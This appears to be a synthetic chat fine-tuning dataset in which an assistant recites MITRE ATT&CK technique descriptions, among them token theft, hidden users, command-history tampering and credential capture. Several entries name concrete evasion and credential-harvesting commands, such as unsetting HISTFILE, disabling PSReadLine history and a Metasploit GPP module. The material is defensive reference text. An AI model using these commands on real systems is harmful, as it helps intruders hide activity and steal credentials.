{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Cloud Services' and with the Id: T1021.007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Cloud Services' and with the Id: T1021.007 is described as follows: Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. Many enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.In some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. . The systems targeted by this attack pattern are: Office 365, Azure AD, SaaS, IaaS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Port Knocking' and with the Id: T1205.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Port Knocking' and with the Id: T1205.001 is described as follows: Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.. The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'LNK Icon Smuggling' and with the Id: T1027.012 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'LNK Icon Smuggling' and with the Id: T1027.012 is described as follows: Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the `IconEnvironmentDataBlock`) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory. Adversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., [Malicious File](https://attack.mitre.org/techniques/T1204/002)), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked by [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)/[System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218) arguments within the target path field of the LNK.(Citation: Unprotect Shortcut)(Citation: Booby Trap Shortcut 2017)LNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads. . The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Web Services' and with the Id: T1583.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Web Services' and with the Id: T1583.006 is described as follows: Adversaries may register for web services\u00a0that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566). Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise.(Citation: FireEye APT29) By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Steal Application Access Token' and with the Id: T1528 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Steal Application Access Token' and with the Id: T1528 is described as follows: Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019)  Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.For example, in Kubernetes environments, processes running inside a container may communicate with the Kubernetes API server using service account tokens. If a container is compromised, an adversary may be able to steal the container\u2019s token and thereby gain access to Kubernetes API commands.(Citation: Kubernetes Service Accounts)  Similarly, instances within continuous-development / continuous-integration (CI/CD) pipelines will often use API tokens to authenticate to other services for testing and deployment.(Citation: Cider Security Top 10 CICD Security Risks) If these pipelines are compromised, adversaries may be able to steal these tokens and leverage their privileges.Token theft can also occur through social engineering, in which case user action may be required to grant access. OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials.  Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.(Citation: Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm OAuth 2017) The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019) Then, they can send a [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1550/001).(Citation: Microsoft - Azure AD Identity Tokens - Aug 2019)Application access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens(Citation: Auth0 Understanding Refresh Tokens), allowing them to obtain new access tokens without prompting the user.  . The systems targeted by this attack pattern are: SaaS, Office 365, Azure AD, Google Workspace, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Spearphishing Attachment' and with the Id: T1598.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Spearphishing Attachment' and with the Id: T1598.002 is described as follows: Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file.(Citation: Sophos Attachment)(Citation: GitHub Phishery) The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Additional Cloud Credentials' and with the Id: T1098.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Additional Cloud Credentials' and with the Id: T1098.001 is described as follows: Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.For example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)In infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)Adversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation: Sysdig ScarletEel 2.0) For example, in Azure AD environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal\u2019s roles and permissions, which may be different from those of the Application Administrator.(Citation: SpecterOps Azure Privilege Escalation) In AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials to [Forge Web Credentials](https://attack.mitre.org/techniques/T1606) tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account\u2019s API credentials are deactivated.(Citation: Crowdstrike AWS User Federation Persistence). The systems targeted by this attack pattern are: IaaS, Azure AD, SaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'User Execution' and with the Id: T1204 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'User Execution' and with the Id: T1204 is described as follows: An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).While [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).Adversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s; or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204).(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery). The systems targeted by this attack pattern are: Linux, Windows, macOS, IaaS, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Internal Defacement' and with the Id: T1491.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Internal Defacement' and with the Id: T1491.001 is described as follows: An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster) Disturbing or offensive images may be used as a part of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.(Citation: Novetta Blockbuster Destructive Malware). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hidden Users' and with the Id: T1564.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hidden Users' and with the Id: T1564.002 is described as follows: Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file.(Citation: Cybereason OSX Pirrit) Every user has a userID associated with it. When the <code>Hide500Users</code> key value is set to <code>TRUE</code>, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the <code>dscl</code> utility to create hidden user accounts by setting the <code>IsHidden</code> attribute to <code>1</code>. Adversaries can also hide a user\u2019s home folder by changing the <code>chflags</code> to hidden.(Citation: Apple Support Hide a User Account) Adversaries may similarly hide user accounts in Windows. Adversaries can set the <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code> Registry key value to <code>0</code> for a specific user to prevent that user from being listed on the logon screen.(Citation: FireEye SMOKEDHAM June 2021)(Citation: US-CERT TA18-074A)On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>).(Citation: Hide GDM User Accounts) Display Managers are not anchored to specific distributions and may be changed by a user or adversary.. The systems targeted by this attack pattern are: macOS, Windows, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Make and Impersonate Token' and with the Id: T1134.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Make and Impersonate Token' and with the Id: T1134.003 is described as follows: Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function.(Citation: LogonUserW function) The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.This behavior is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) in that this refers to creating a new user token instead of stealing or duplicating an existing one.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Group Policy Preferences' and with the Id: T1552.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Group Policy Preferences' and with the Id: T1552.006 is described as follows: Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:* Metasploit\u2019s post exploitation module: <code>post/windows/gather/credentials/gpp</code>* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)* gpprefdecrypt.pyOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Control Panel Items' and with the Id: T1196 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Control Panel Items' and with the Id: T1196 is described as follows: Windows Control Panel items are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013)For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. (Citation: Microsoft Implementing CPL)Adversaries can use Control Panel items as execution payloads to execute arbitrary commands. Malicious Control Panel items can be delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) campaigns (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware. (Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension whitelisting.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration Over Asymmetric Encrypted Non-C2 Protocol' and with the Id: T1048.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration Over Asymmetric Encrypted Non-C2 Protocol' and with the Id: T1048.002 is described as follows: Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol. . The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Cloud Account' and with the Id: T1087.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Cloud Account' and with the Id: T1087.004 is described as follows: Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.With authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance) The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018) The AWS command <code>aws iam list-users</code> may be used to obtain a list of users in the current account while <code>aws iam list-roles</code> can obtain IAM roles that have a specified path prefix.(Citation: AWS List Roles)(Citation: AWS List Users) In GCP, <code>gcloud iam service-accounts list</code> and <code>gcloud projects get-iam-policy</code> may be used to obtain a listing of service accounts and users in a project.(Citation: Google Cloud - IAM Servie Accounts List API). The systems targeted by this attack pattern are: Azure AD, Office 365, SaaS, IaaS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Process Discovery' and with the Id: T1057 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Process Discovery' and with the Id: T1057 is described as follows: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.In Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show processes` can be used to display current running processes.(Citation: US-CERT-TA18-106A)(Citation: show_processes_cisco_cmd). The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Impair Command History Logging' and with the Id: T1562.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Impair Command History Logging' and with the Id: T1562.003 is described as follows: Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. On Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.Adversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. On Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).. The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Launchd' and with the Id: T1053.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Launchd' and with the Id: T1053.004 is described as follows: This technique is deprecated due to the inaccurate usage. The report cited did not provide technical detail as to how the malware interacted directly with launchd rather than going through known services. Other system services are used to interact with launchd rather than launchd being used by itself. Adversaries may abuse the <code>Launchd</code> daemon to perform task scheduling for initial or recurring execution of malicious code. The <code>launchd</code> daemon, native to macOS, is responsible for loading and maintaining services within the operating system. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <code>/System/Library/LaunchDaemons</code> and <code>/Library/LaunchDaemons</code> (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files which point to the executables that will be launched (Citation: Methods of Mac Malware Persistence).An adversary may use the <code>launchd</code> daemon in macOS environments to schedule new executables to run at system startup or on a scheduled basis for persistence. <code>launchd</code> can also be abused to run a process under the context of a specified account. Daemons, such as <code>launchd</code>, run with the permissions of the root user account, and will operate regardless of which user account is logged in.. The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Provider DLL' and with the Id: T1556.008 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Provider DLL' and with the Id: T1556.008 is described as follows: Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions.(Citation: Network Provider API) During the logon process, Winlogon (the interactive logon module) sends credentials to the local `mpnotify.exe` process via RPC. The `mpnotify.exe` process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.(Citation: NPPSPY - Huntress)(Citation: NPPSPY Video)(Citation: NPLogonNotify) Adversaries can configure a malicious network provider DLL to receive credentials from `mpnotify.exe`.(Citation: NPPSPY) Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the `NPLogonNotify()` function.(Citation: NPLogonNotify)Adversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.(Citation: NPPSPY - Huntress). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Windows Management Instrumentation Event Subscription' and with the Id: T1546.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Windows Management Instrumentation Event Subscription' and with the Id: T1546.003 is described as follows: Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.(Citation: Mandiant M-Trends 2015)Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.(Citation: FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts \u2013 using `mofcomp.exe`  \u2013into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation: Dell WMI Persistence)(Citation: Microsoft MOF May 2018)WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'CDNs' and with the Id: T1596.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'CDNs' and with the Id: T1596.004 is described as follows: Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor\u2019s geographical region.Adversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization\u2019s website.(Citation: DigitalShadows CDN) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'User Activity Based Checks' and with the Id: T1497.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'User Activity Based Checks' and with the Id: T1497.002 is described as follows: Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017) . The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
